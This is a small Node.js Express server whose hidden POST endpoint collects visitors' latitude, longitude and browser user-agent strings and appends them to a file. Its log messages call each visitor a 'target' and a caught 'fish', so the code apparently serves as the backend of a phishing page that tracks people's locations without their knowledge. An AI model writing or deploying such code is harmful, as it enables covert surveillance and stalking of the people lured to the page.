const express = require('express');
const { appendFile } = require('fs');
const app = express()
const path = require('path');
var bodyParser = require('body-parser')
var jsonParser = bodyParser.json()
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '/index.html'))
})

app.get('/style.css', function(req, res) {
    res.sendFile(path.join(__dirname, '/style.css'));
});

app.post('/kkllopasejis',jsonParser,(req,res)=>{
    const reqBody = req.body
    console.log("new target from a device : "+ req.headers['user-agent'])
    appendFile(
        'locations.txt', 
        "browser info: "+req.headers['user-agent']+"\nlatitude longitude: "+reqBody.latitude+" "+reqBody.longitude+"\n\n",
        ()=>{
            console.log("got another fish! 🎣")
        }
    )
    res.send({success:true})
})

console.log("port 3000")
app.listen(3000)